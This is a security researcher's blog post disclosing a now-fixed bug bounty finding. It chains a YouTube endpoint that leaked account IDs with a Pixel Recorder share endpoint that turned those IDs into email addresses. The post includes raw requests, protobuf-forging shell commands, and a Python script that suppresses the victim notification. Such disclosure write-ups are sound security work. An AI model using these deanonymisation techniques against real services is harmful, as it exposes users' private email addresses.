# Leaking the email of any YouTube user for $10,000

**来源:** https://brutecat.com
**链接:** https://brutecat.com/articles/leaking-youtube-emails
**日期:** Wed, 12 Feb 2025 00:00:00 GMT

---

[< Back](/)

[< Back](/)

## Leaking the email of any YouTube user for $10,000

2025-02-12

![Leaking the email of any YouTube user for $10,000](/assets/youtube-email-disclosure.png)

Some time ago, I was looking for a research target in Google and was digging through the [Internal People API (Staging)](https://staging-people-pa.sandbox.googleapis.com/$discovery/rest?key=AIzaSyBOh-LSTdP2ddSgqPk6ceLEKTb8viTIvdw) discovery document until I noticed something interesting:
    
    
       "BlockedTarget": {
          "id": "BlockedTarget",
          "description": "The target of a user-to-user block, used to specify creation/deletion of blocks.",
          "type": "object",
          "properties": {
            "profileId": {
              "description": "Required. The obfuscated Gaia ID of the user targeted by the block.",
              "type": "string"
            },
            "fallbackName": {
              "description": "Required for `BlockPeopleRequest`. A display name for the user being blocked. The viewer may see this in other surfaces later, if the blocked user has no profile name visible to them. Notes: * Required for `BlockPeopleRequest` (may not currently be enforced by validation, but should be provided) * For `UnblockPeopleRequest` this does not need to be set.",
              "type": "string"
            }
          }
        },

It seemed the Google-wide block user functionality was based on an obfuscated Gaia ID as well as a display name for that blocked user. The obfuscated Gaia ID is just a Google account identifier.  


That seemed perfectly fine until I remembered [this support page](https://support.google.com/accounts/answer/6388749#zippy=%2Cuse-youtube-to-block-an-account):  


![](/assets/leaking-youtube-emails/use_youtube_to_block.png)

So, if you block someone on YouTube, you can leak their Google account identifier? I tested it out. I went to a random livestream, blocked a user and sure enough, it showed up in <https://myaccount.google.com/blocklist>  


![](/assets/leaking-youtube-emails/blocked_user.png)

The fallback name was set as their channel name **Mega Prime** and the profile ID was their obfuscated Gaia ID **107183641464576740691**  


This was super strange to me because YouTube should never leak the underlying Google account of a YouTube channel. In the past, there's been several bugs to [resolve these to an email address](https://sector035.nl/articles/2022-35), so I was confident there was still a Gaia ID to Email in some old obscure Google product.

### Escalating this to 4 billion YouTube channels

So, we can leak the Gaia ID of any live chat user, but can we escalate this to all channels on YouTube? As it turns out, when you click the 3 dots just to open the context menu, a request is fired:

![](/assets/leaking-youtube-emails/context_menu.png)

**Request**
    
    
    POST /youtubei/v1/live_chat/get_item_context_menu?params=R2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZeklhQ2hoVlExTkZMV0ZaVDJJdGRVTm5NRFU1Y1VoU2FYTmZiM2M9&pbj=1&prettyPrint=false HTTP/2
    Host: www.youtube.com
    Cookie: <redacted>

**Response**
    
    
    HTTP/2 200 OK
    Content-Type: application/json; charset=UTF-8
    Server: scaffolding on HTTPServer2
    
    {
      ...
      "serviceEndpoint": {
        ...
        "commandMetadata": {
          "webCommandMetadata": {
            "sendPost": true,
            "apiUrl": "/youtubei/v1/live_chat/moderate"
          }
        },
        "moderateLiveChatEndpoint": {
          "params": "Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEV6T1RBM05EWTJOVE0zTmpjd016Y3dOVGt3RWhaVFJTMWhXVTlpTFhWRFp6QTFPWEZJVW1selgyOTNjQUElM0Q="
        }
      }
      ...
    }

That `params` is nothing more than just base64 encoded protobuf, which is a common encoding format used throughout Google.  


If we try decoding that `moderateLiveChatEndpoint` params:
    
    
    $ echo -n "Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEV6T1RBM05EWTJOVE0zTmpjd016Y3dOVGt3RWhaVFJTMWhXVTlpTFhWRFp6QTFPWEZJVW1selgyOTNjQUElM0Q=" | base64
     -d | sed 's/%3D/=/g' | base64 -d | protoc --decode_raw
    1 {
      5 {
        1: "UChs0pSaEoNLV4mevBFGaoKA"
        2: "36YnV9STBqc"
      }
    }
    10: 0
    11: 1
    12 {
      1: "113907466537670370590"
      2: "SE-aYOb-uCg059qHRis_ow"
    }
    14: 0

It actually just contains the Gaia ID of the user we want to block, we don't even need to block them!

Let's check out the `get_item_context_menu` requests params too:
    
    
    $ echo -n "R2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZeklhQ2hoVlExTkZMV0ZaVDJJdGRVTm5NRFU1Y1VoU2FYTmZiM2M9" | base64 -d | sed 's/%3D/=/g' | base64 -d | protoc --decode_raw
    3 {
      5 {
        1: "UChs0pSaEoNLV4mevBFGaoKA"
        2: "36YnV9STBqc"
      }
    }
    6 {
      1: "UCSE-aYOb-uCg059qHRis_ow"
    }

Seems to just contain the channel ID of the channel we're blocking, the livestream video ID and livestream author ID. Let's try to fake the request params with our own target's channel ID.  


For this test, we'll use a [Topic Channel](https://www.youtube.com/channel/UCD2LZAT1j1DyVXq2R2BdusQ) since they are [auto-generated by YouTube](https://support.google.com/youtube/answer/7636475#topicchannels) and guaranteed to not have any live chat messages.
    
    
    $ echo -n "<SNIP>" | base64 -d | sed 's/%3D/=/g' | base64 -d | sed 's/UCSE-aYOb-uCg059qHRis_ow/UCD2LZAT1j1DyVXq2R2BdusQ/g' | base64 | base64
    R2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZeklhQ2hoVlEwUXlURnBCVkRGcQpNVVI1VmxoeE1sSXlRbVIxYzFFPQo=

Testing this on `/youtubei/v1/live_chat/get_item_context_menu`:
    
    
    ...
    "moderateLiveChatEndpoint":{"params":"Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEF6TWpZeE9UYzBNakl4T0RJNU9Ea3lNVFkzRWhaRU1reGFRVlF4YWpGRWVWWlljVEpTTWtKa2RYTlJjQUElM0Q="}
    ...
    
    
    echo -n "Q2lrcUp3b1lWVU5vY3pCd1UyRkZiMDVNVmpSdFpYWkNSa2RoYjB0QkVnc3pObGx1VmpsVFZFSnhZMUFBV0FGaUx3b1ZNVEF6TWpZeE9UYzBNakl4T0RJNU9Ea3lNVFkzRWhaRU1reGFRVlF4YWpGRWVWWlljVEpTTWtKa2RYTlJjQUElM0Q=" | base64 -d | sed 's/%3D/=/g' | base64 -d | protoc --decode_raw
    1 {
      5 {
        1: "UChs0pSaEoNLV4mevBFGaoKA"
        2: "36YnV9STBqc"
      }
    }
    10: 0
    11: 1
    12 {
      1: "103261974221829892167"
      2: "D2LZAT1j1DyVXq2R2BdusQ"
    }
    14: 0

We can leak the Gaia ID of the channel - **103261974221829892167**

### The missing puzzle piece: Pixel Recorder

I told my friend [nathan](https://schizo.org) about the YouTube Gaia ID leak and we started looking into old forgotten Google products since they probably contained some bug or logic flaw to resolve a Gaia ID to an email. [Pixel Recorder](https://recorder.google.com) was one of them. Nathan made a test recording on his Pixel phone and synced it to his Google account so we could access the endpoints on the web at <https://recorder.google.com>:  


![](/assets/leaking-youtube-emails/recorder_home_page.png)

When we tried sharing the recording to a test email, that's when it hit us:

**Request**
    
    
    POST /$rpc/java.com.google.wireless.android.pixel.recorder.protos.PlaybackService/WriteShareList HTTP/2
    Host: pixelrecorder-pa.clients6.google.com
    Cookie: <redacted>
    Content-Length: 80
    Authorization: <redacted>
    X-Goog-Api-Key: AIzaSyCqafaaFzCP07GzWUSRw0oXErxSlrEX2Ro
    Content-Type: application/json+protobuf
    Referer: https://recorder.google.com/
    
    ["7adab89e-4ace-4945-9f75-6fe250ccbe49",null,[["113769094563819690011",2,null]]]

**Response**
    
    
    HTTP/2 200 OK
    Content-Type: application/json+protobuf; charset=UTF-8
    Server: ESF
    Content-Length: 138
    
    ["28bc3792-9bdb-4aed-9a78-17b0954abc7d",[[null,2,"[[email protected]](/cdn-cgi/l/email-protection)"]]]

This endpoint was taking in the obfuscated Gaia ID and... **returning the email?**  


We tested this with the obfuscated Gaia ID `107183641464576740691` we got from blocking that user on YouTube a while back and **it worked** :
    
    
    HTTP/2 200 OK
    Content-Type: application/json+protobuf; charset=UTF-8
    Server: ESF
    Content-Length: 138
    
    ["28bc3792-9bdb-4aed-9a78-17b0954abc7d",[[null,2,"[[email protected]](/cdn-cgi/l/email-protection)"],[null,2,"[[email protected]](/cdn-cgi/l/email-protection)"]]]

### A small problem: preventing notification to the target

It seems that whenever we share a recording with a victim, they receive an email that looks like this:  


![](/assets/leaking-youtube-emails/recorder_victim.png)

This is **really bad** , and it would lower the impact of the bug quite a lot. On the share pop-up, there didn't seem to be any option to disable notifications.

![](/assets/leaking-youtube-emails/share_recording.png)

I tried leaking the full request proto via my tool [req2proto](https://github.com/ddd/req2proto), but there was nothing about disabling the email notification:
    
    
    syntax = "proto3";
    
    package java.com.google.wireless.android.pixel.recorder.protos;
    
    import "java/com/google/wireless/android/pixel/recorder/sharedclient/acl/protos/message.proto";
    
    message WriteShareListRequest {
      string recording_id = 1;
      string delete_obfuscated_gaia_ids = 2;
      ShareUser update_shared_users = 3;
      string sharing_message = 4;
    }
    
    message ShareUser {
      string obfuscated_gaia_id = 1;
      java.com.google.wireless.android.pixel.recorder.sharedclient.acl.protos.ResourceAccessRole role = 2;
      string email = 3;
    }

Even trying to add and remove the user at the same time didn't work, the email was still sent. But that's when we realized - if it's including our recording title in the email subject, perhaps it wouldn't be able to send an email if our recording title was too long.  


We hacked together a quick python script to test this out:
    
    
    import requests
    
    BASE_URL = "https://pixelrecorder-pa.clients6.google.com/$rpc/java.com.google.wireless.android.pixel.recorder.protos.PlaybackService/"
    
    headers = {
        "Host": "pixelrecorder-pa.clients6.google.com",
        "Content-Type": "application/json+protobuf",
        "X-Goog-Api-Key": "AIzaSyCqafaaFzCP07GzWUSRw0oXErxSlrEX2Ro",
        "Origin": "https://recorder.google.com"
    }
    
    def get_recording_uuid(share_id: str):
        payload = f"[\"{share_id}\"]"
        response = requests.post(BASE_URL + "GetRecordingInfo" + "?alt=json", headers=headers, data=payload)
        if response.status_code != 200:
            print("unknown error when getting recording uuid: ", response.json())
            exit(1)
        try:
            response = response.json()
        except:
            print('can\'t parse response when getting recording uuid: ', response.text)
            exit(1)
    
        return response["recording"]["uuid"]
    
    def update_recording_title(share_id: str):
        x = 'X'*2500000 # 2.5 million char long title name!
        payload = f'["{share_id}","{x}"]'
        response = requests.post(BASE_URL + "UpdateRecordingTitle" + "?alt=json", headers=headers, data=payload)
        if response.status_code != 200:
            print("unknown error when updating recording title: ", response.json())
            exit(1)
    
    def main():
        share_id = input("Enter share ID: ")
        headers["Cookie"] = input("Cookie header:" )
        headers["Authorization"] = input("Authorization header: ")
        uuid = get_recording_uuid(share_id)
        print("UUID:", uuid)
        update_recording_title(uuid)
        print("Updated recording title successfully.")
    
    if __name__ == "__main__":
        main()

... and the recording title was now **2.5 million letters long!** There wasn't any server-side limit to the length of a recording name.  


![](/assets/leaking-youtube-emails/long_recording_name.png)  


Trying to share the recording with a different test user... **bingo!** No notification email.  


![](/assets/leaking-youtube-emails/no_gmail_notification.png)

### Putting it all together

We basically have the full attack chain, we just have to put it together.

  * Leak the obfuscated Gaia ID of the YouTube channel from the Innertube endpoint `/get_item_context_menu`
  * Share the Pixel recording with an extremely long name with the target to convert the Gaia ID to an email
  * Remove the target from the Pixel recording (cleanup)



Here's a POC of the exploit in action:

### Timeline

  * 2024-09-15 - Report sent to vendor
  * 2024-09-16 - Vendor triaged report
  * 2024-09-16 - 🎉 **Nice catch!**
  * 2024-10-03 - Panel marks it as duplicate of existing-tracked bug, does botched patch of initial YouTube obfuscated Gaia ID disclosure
  * 2024-10-03 - Clarified to vendor that they haven't recognized Pixel recorder as vulnerability itself (since obfuscated Gaia IDs are leaked for Google Maps/Play reviewers) and provided vendor a work-around method to once again leak YouTube channel obfuscated Gaia IDs
  * 2024-11-05 - **Panel awards $3,133.** Rationale: Exploitation likelihood is medium. Issue qualified as an abuse-related methodology with high impact.
  * 2024-12-03 - Product team sent report back to panel for additional reward consideration, coordinates disclosure for 2025-02-03
  * 2024-12-12 - **Panel awards an additional $7,500.** Rationale: Exploitation likelihood is high. Issue qualified as an abuse-related methodology with high impact. Applied 1 downgrade from the base amount due to complexity of attack chain required.
  * 2025-01-29 - Vendor requests extension for disclosure to 2025-02-02
  * 2025-02-09 - Confirm to vendor that both parts of the exploit have been fixed (T+147 days since disclosure)
  * 2025-02-12 - Report disclosed



* * *

You can contact me via [![Signal messenger](data:image/svg+xml,%3c!DOCTYPE%20svg%20PUBLIC%20'-//W3C//DTD%20SVG%201.1//EN'%20'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'%3e%3c!--%20Uploaded%20to:%20SVG%20Repo,%20www.svgrepo.com,%20Transformed%20by:%20SVG%20Repo%20Mixer%20Tools%20--%3e%3csvg%20width='800px'%20height='800px'%20viewBox='0%200%2048%2048'%20id='Layer_2'%20data-name='Layer%202'%20xmlns='http://www.w3.org/2000/svg'%20fill='%23ffffff'%20stroke='%23ffffff'%3e%3cg%20id='SVGRepo_bgCarrier'%20stroke-width='0'/%3e%3cg%20id='SVGRepo_tracerCarrier'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3cg%20id='SVGRepo_iconCarrier'%3e%3cdefs%3e%3cstyle%3e.cls-1{fill:none;stroke:%23ffffff;stroke-linejoin:round;}%3c/style%3e%3c/defs%3e%3cpath%20stroke-width='2px'%20class='cls-1'%20d='M27.32,45.25A23.08,23.08,0,0,1,24,45.5a22.26,22.26,0,0,1-3.26-.25m14.44-2.88a21,21,0,0,1-6.08,2.51M41.36,36.7a21.63,21.63,0,0,1-4.66,4.65m5.65-6.16,2.54-6.08a21.25,21.25,0,0,1-2.52,6.07m2.88-14.42A23.33,23.33,0,0,1,45.5,24a22.43,22.43,0,0,1-.25,3.28m-42.46,0A22.46,22.46,0,0,1,2.5,24a22.43,22.43,0,0,1,.25-3.28m39.63-7.89a21.7,21.7,0,0,1,2.51,6.08m-41.69,0a21.19,21.19,0,0,1,2.52-6.06h0m31-6.2a21.19,21.19,0,0,1,4.66,4.65m-34.71,0A21.63,21.63,0,0,1,11.3,6.64M29.09,3.1a21.57,21.57,0,0,1,6.07,2.53h0m-22.33,0a21.07,21.07,0,0,1,6.09-2.51m1.84-.37A21.88,21.88,0,0,1,24,2.5a22.29,22.29,0,0,1,3.27.25'/%3e%3cpath%20stroke-width='2px'%20class='cls-1'%20d='M18.87,44.87a20.92,20.92,0,0,1-5-1.95l-2.24.51'/%3e%3cpath%20stroke-width='2px'%20class='cls-1'%20d='M4.61,36.38l.51-2.2a21.7,21.7,0,0,1-2-5'/%3e%3cpath%20stroke-width='2px'%20class='cls-1'%20d='M10,43.85l-4.08,1a2.19,2.19,0,0,1-2.66-1.56,2.27,2.27,0,0,1,0-1.1l1-4.08'/%3e%3cpath%20stroke-width='2px'%20class='cls-1'%20d='M24,6.41a17.59,17.59,0,0,0-14.83,27l-1.65,7.1,7.16-1.64A17.59,17.59,0,1,0,24,6.41Z'/%3e%3c/g%3e%3c/svg%3e)](https://signal.me/#eu/DK2edygXRPMdt8bnQk0kIz-WNKt40rCDvY-WAi7a4q5ATEQwRxdIGIMSHAJFCgIb) or [![Email](data:image/svg+xml,%3c!DOCTYPE%20svg%20PUBLIC%20'-//W3C//DTD%20SVG%201.1//EN'%20'http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd'%3e%3c!--%20Uploaded%20to:%20SVG%20Repo,%20www.svgrepo.com,%20Transformed%20by:%20SVG%20Repo%20Mixer%20Tools%20--%3e%3csvg%20width='800px'%20height='800px'%20viewBox='0%200%2024%2024'%20fill='none'%20xmlns='http://www.w3.org/2000/svg'%3e%3cg%20id='SVGRepo_bgCarrier'%20stroke-width='0'/%3e%3cg%20id='SVGRepo_tracerCarrier'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3cg%20id='SVGRepo_iconCarrier'%3e%3cpath%20d='M4%207.00005L10.2%2011.65C11.2667%2012.45%2012.7333%2012.45%2013.8%2011.65L20%207'%20stroke='%23ffffff'%20stroke-width='1'%20stroke-linecap='round'%20stroke-linejoin='round'/%3e%3crect%20x='3'%20y='5'%20width='18'%20height='14'%20rx='2'%20stroke='%23ffffff'%20stroke-width='1'%20stroke-linecap='round'/%3e%3c/g%3e%3c/svg%3e)](/cdn-cgi/l/email-protection#73011c1c073311010607161012075d101c1e)
